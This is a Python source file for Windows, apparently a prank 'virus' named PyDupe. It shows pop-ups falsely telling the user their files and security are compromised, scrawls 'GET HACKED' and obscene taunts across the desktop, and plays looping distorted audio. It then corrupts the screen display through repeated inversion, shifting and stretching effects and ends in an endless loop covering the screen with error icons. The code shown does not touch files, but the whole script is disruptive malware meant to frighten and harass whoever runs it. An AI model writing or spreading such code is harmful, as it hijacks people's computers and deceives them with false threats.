import time
import tkinter as tk
from tkinter import messagebox
import random
from win32api import *
from win32con import *
from win32gui import *
from ctypes import windll
import win32api
import win32con
import win32gui
import ctypes
import random
import time
import math
import tkinter.messagebox as msg
import numpy as mp 
import sounddevice as sd
import winsound
import os   
import numpy
from threading import Thread
import os    
from win32gui import *
from win32api import *
from win32ui import *
from win32con import *
from random import randint
import ctypes
import numpy as np
import sounddevice as sd
import time
from threading import Thread
from random import *
import winsound
import ctypes
import numpy as np
import sounddevice as sd
import random
import subprocess


def show_message_box(message):
    messagebox.showinfo("ERROR", message)

# Create the main window
root = tk.Tk()
root.withdraw()  # Hide the main window

# Show the first message box
show_message_box("Congratulations! You've just been visited by the PyDupe virus. Consider this a digital handshake. Your files are now my playground, and your security is but a distant memory. No need to panic; I won't erase everything... yet. Just a friendly reminder that your defenses were not as good as you thought. Keep an eye on your digital life; you never know where I might pop up next. Best, PyDupe")
time.sleep(1.5)
# Show the second message box
show_message_box("Tick-tock, tick-tock. I hope you've enjoyed our little introduction. It's time to brace yourself for what comes next. My digital tendrils are spreading, and your files are dancing to my tune. You might want to double-check your security; it's about to glitch and groan under the pressure. This is your last chance to beef up those defenses because once the glitch hits, there's no turning back. Prepare yourself, PyDupe")

#add your additional code here
x, y = 0, 0
signX, signY = 1, 1
incrementor = 20
for _ in range(500):
        w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
        text = "GET HACKED"
        color = random.randint(0, 255) | (random.randint(0, 255) << 8) | (random.randint(0, 255) << 16)
        SetTextColor(hdc, color)
        SetBkMode(hdc, 0)
        ExtTextOut(hdc, x, y, 0, None, text, None)
        x += incrementor * signX
        y += incrementor * signY
        if y >= h or y <= 0:
            signY *= -1
        if x >= w or x <= 0:
            signX *= -1
        time.sleep(0.01)
        ReleaseDC(0, hdc)

show_message_box("you are such a loser -PyDupe")

from pyaudio import PyAudio, paUInt8
import threading

pa = PyAudio()
audio = pa.open(
    format=paUInt8,
    channels=1,
    rate=8448,
    output=True
)

formula = 't<<2^t>>4^t<<4&t>>8|t<<1&-t>>4'

def play_audio():
    time = 0
    while True:
        values = []
        for _i in range(0x100):
            values.append(0xFF & eval(formula, {'t': time}))
            time += 1

        audio.write(bytes(values))

# Start playing audio in a separate thread
audio_thread = threading.Thread(target=play_audio)
audio_thread.daemon = True
audio_thread.start()

# Keep the main thread running indefinitely




w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
BitBlt(hdc, 20, 0, w, h, hdc, 0, 0, SRCCOPY)
ReleaseDC(0, hdc)

for _ in range(10):
        w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
        BitBlt(hdc, random.randint(-500, 500), random.randint(-500, 500), w, h, hdc, random.randint(-500, 500), random.randint(-500, 500), SRCCOPY)
        ReleaseDC(0, hdc)
        w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
        hdcDest = CreateCompatibleDC(hdc)
        hBitmap = CreateCompatibleBitmap(hdc, w, h)
        SelectObject(hdcDest, hBitmap)
        hBrush = CreateSolidBrush(RGB(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)))
        SelectObject(hdcDest, hBrush)
        Rectangle(hdcDest, 0, 0, w, h)
        BitBlt(hdc, 0, 0, w, h, hdcDest, 0, 0, SRCINVERT)
        DeleteObject(hBitmap)
        DeleteObject(hBrush)
        DeleteDC(hdcDest)
        ReleaseDC(0, hdc)
        w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
        BitBlt(hdc, random.randint(-10, 10), random.randint(-10, 10), w, h, hdc, 0, 0, SRCCOPY)
        BitBlt(hdc, 0, 0, w, h, hdc, random.randint(-10, 10), random.randint(-10, 10), SRCCOPY)
        ReleaseDC(0, hdc)
for _ in range(10):
        w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
        BitBlt(hdc, random.randint(0, 1), random.randint(0, 1), w, h, hdc, random.randint(0, 1), random.randint(0, 1), SRCPAINT)
        time.sleep(0.09)
        ReleaseDC(0, hdc)
time.sleep(1.5)
for _ in range(70):  # Loop 20 times
        desk = win32gui.GetDC(0)
        sw = win32api.GetSystemMetrics(0)
        sh = win32api.GetSystemMetrics(1)
        win32gui.StretchBlt(desk, -20, 0, sw + 40, sh, desk, 0, 0, sw, sh, win32con.SRCCOPY)
        win32gui.ReleaseDC(0, desk)
for _ in range(250):
        w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
        hdcDest = CreateCompatibleDC(hdc)
        hBitmap = CreateCompatibleBitmap(hdc, w, h)
        SelectObject(hdcDest, hBitmap)
        hBrush = CreateSolidBrush(RGB(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)))
        SelectObject(hdcDest, hBrush)
        Rectangle(hdcDest, 0, 0, w, h)
        BitBlt(hdc, 0, 0, w, h, hdcDest, 0, 0, SRCINVERT)
        DeleteObject(hBitmap)
        DeleteObject(hBrush)
        DeleteDC(hdcDest)
        ReleaseDC(0, hdc)
        w, hdc = GetSystemMetrics(0), GetDC(0)
        text = "PyDupe Fucked Your Computer LOL"
        color = random.randint(0, 255) | (random.randint(0, 255) << 8) | (random.randint(0, 255) << 16)
        SetTextColor(hdc, color)
        SetBkMode(hdc, 0)
        x, y = random.randint(0, w), random.randint(0, w)
        ExtTextOut(hdc, x, y, 0, None, text, None)
        time.sleep(0.001)
        ReleaseDC(0, hdc)
for _ in range(120):
        hdc = win32gui.GetDC(0)
        x = win32api.GetSystemMetrics(win32con.SM_CXSCREEN)
        y = win32api.GetSystemMetrics(win32con.SM_CYSCREEN)
        w = win32api.GetSystemMetrics(0)
        h = win32api.GetSystemMetrics(1)
        win32gui.BitBlt(hdc, random.randint(0, 666), random.randint(0, 666), w, h, hdc, random.randint(0, 666), random.randint(0, 666), win32con.NOTSRCERASE)
        time.sleep(0.01)  # Sleep for 10 milliseconds
        win32gui.ReleaseDC(0, hdc)
time.sleep(0.6)
for _ in range(350):
    hdc = win32gui.GetDC(None)
    w = win32api.GetSystemMetrics(win32con.SM_CXSCREEN)
    h = win32api.GetSystemMetrics(win32con.SM_CYSCREEN)
    rx = random.randint(0, w)
    win32gui.BitBlt(hdc, rx, 10, 200, h, hdc, rx, 0, win32con.SRCCOPY)
    win32gui.ReleaseDC(None, hdc)
for _ in range(30):
        hdc = win32gui.GetDC(0)
        x = win32api.GetSystemMetrics(win32con.SM_CXSCREEN)
        y = win32api.GetSystemMetrics(win32con.SM_CYSCREEN)
        win32gui.StretchBlt(hdc, -10, -10, x + 20, y + 20, hdc, 0, 0, x, y, win32con.SRCCOPY)
        win32gui.StretchBlt(hdc, 10, 10, x - 20, y - 20, hdc, 0, 0, x, y, win32con.SRCCOPY)
        win32gui.ReleaseDC(0, hdc)
for _ in range(6):
        hdc = win32gui.GetDC(0)
        x = win32api.GetSystemMetrics(win32con.SM_CXSCREEN)
        y = win32api.GetSystemMetrics(win32con.SM_CYSCREEN)
        w = win32api.GetSystemMetrics(0)
        h = win32api.GetSystemMetrics(1)
        win32gui.BitBlt(hdc, random.randint(0, 222), random.randint(0, 222), w, h, hdc, random.randint(0, 222), random.randint(0, 222), win32con.NOTSRCERASE)
        time.sleep(0.01)
        win32gui.ReleaseDC(0, hdc)
for _ in range(30):
        w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
        BitBlt(hdc, random.randint(-10, 10), random.randint(-10, 10), w, h, hdc, 0, 0, SRCCOPY)
        BitBlt(hdc, 0, 0, w, h, hdc, random.randint(-10, 10), random.randint(-10, 10), SRCCOPY)
        ReleaseDC(0, hdc)
time.sleep(2)
for _ in range(30):
        w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
        colors = (RGB(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)), RGB(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)))
        hPen, hBrush = CreatePen(PS_SOLID, 2, colors[0]), CreateSolidBrush(colors[1])
        SelectObject(hdc, hPen), SelectObject(hdc, hBrush)
        Polygon(hdc, [(random.randint(0, w), random.randint(0, h)) for _ in range(3)])
        SelectObject(hdc, None), SelectObject(hdc, None)
        DeleteObject(hPen), DeleteObject(hBrush)
        ReleaseDC(0, hdc)

        w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
        BitBlt(hdc, random.randint(-500, 500), random.randint(-500, 500), w, h, hdc, random.randint(-500, 500), random.randint(-500, 500), SRCCOPY)
        ReleaseDC(0, hdc)
        w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
        BitBlt(hdc, 0, 0, w, h, hdc, 1, 1, MERGEPAINT)
        BitBlt(hdc, 1, 1, w, h, hdc, 0, 0, MERGEPAINT)
        ReleaseDC(0, hdc)
for _ in range(30):
      hdc = win32gui.GetDC(0)
user32 = ctypes.windll.user32
user32.SetProcessDPIAware()
[w, h] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)]


x = y = 0
while True:
    win32gui.DrawIcon(hdc, x , y , win32gui.LoadIcon(None, win32con.IDI_ERROR)) # Change IDI_ERROR to something else to change the icon being displayed
    x = x + 30
    if x >= w:
        y = y + 30
        x = 0
    if y >= h:
        x = y = 0
